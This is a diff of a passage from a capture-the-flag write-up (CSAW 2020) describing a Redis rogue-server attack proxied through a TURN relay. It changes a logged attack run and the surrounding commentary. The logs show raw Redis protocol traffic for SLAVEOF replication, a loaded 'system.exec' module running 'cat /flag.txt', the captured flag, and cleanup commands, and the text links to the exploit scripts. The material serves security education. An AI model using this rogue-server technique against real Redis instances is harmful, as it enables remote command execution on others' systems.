@@ -602,37 +602,10 @@ value None
 [->] b'+OK\r\n'
 [<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
 [->] b'+OK\r\n'
-[<<] system.exec "cat /flag.txt"
-[<-] b'*2\r\n$11\r\nsystem.exec\r\n$27\r\nsystem.exec "cat /flag.txt"\r\n'
-[->] b'$5\r\n0\n96\n\r\n'
-[>>] 0
-[>>] 96
-[<<] system.exec "cat /flag.txt"
-[<-] b'*2\r\n$11\r\nsystem.exec\r\n$27\r\nsystem.exec "cat /flag.txt"\r\n'
-[->] b'$0\r\n\r\n'
-```
-
-Looking at the output, it looks as if pretty much everything went to plan, except for when we run our new `system.exec` command.  The
-response is not quite what we expect.  Perhaps we need to make some additional changes to the rogue redis server code.  *Or*, we could just use
-our previous script and proxy in a new interactive connection we know that works already.
-
-```sh
-╭─zoey@virtual-parrot ~/sec/csaw/webrtc ‹master*› 
-╰─$ ./redis-proxy.py 
-generated txn id b'49e40549d4c5a1d5b9fc9fb0'
-Raw Allocation Request Response b'\x01\x03\x00
-
-...
-
-system.exec "cat /flag.txt"
-$44
-flag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?}
-```
-
-Success! When we hit CTRL+C to cancel the interactivity for the rogue server, it then sends its clean up commands, restoring the original
-state.
-
-```python
+[<<] cat /flag.txt
+[<-] b'*2\r\n$11\r\nsystem.exec\r\n$27\r\n"cat /flag.txt"\r\n'
+[->] b'$44\r\nflag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?}\n\r\n'
+[>>] flag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?}
 [<<] ^C[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
 [->] b'+OK\r\n'
 [<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$4\r\n/app\r\n'
@@ -642,5 +615,8 @@ state.
 [<-] b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n'
 [->] b'+OK\r\n'
 ```
+
+Looking at the output, it looks as if everything went to plan!  We get an interactive shell after the connection and can run `cat /flag.txt` in order to
+retrieve the flag.  When we hit CTRL+C to cancel the interactivity for the rogue server, it sends clean up commands, restoring the original state.
 
 The full `redis-proxy.py` script is available at https://github.com/zoeyg/public-write-ups/blob/master/csaw-2020/redis-proxy.py, and the modified `redis-rogue-server.py` script is available at https://github.com/zoeyg/public-write-ups/blob/master/csaw-2020/redis-rogue-server.py.
